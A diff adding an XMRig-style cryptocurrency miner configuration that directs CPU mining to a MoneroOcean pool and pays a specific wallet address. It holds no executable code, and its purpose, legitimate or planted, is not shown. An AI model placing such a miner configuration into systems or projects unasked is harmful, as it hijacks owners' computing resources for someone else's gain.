@@ -1,0 +1,21 @@
+{
+    "autosave": false,
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 40
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "algo": null,
+            "url": "gulf.moneroocean.stream:443",
+            "user": "45UpkYXaDZWYWF7fnSuXdfMuwVVfHPnAA2Z4akZP9RJ4EiSaN7WARVJYU1TEMnwNJVNzEU9EokjQSMakP4TXqBKKCuEJQP2",
+            "pass": "M",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
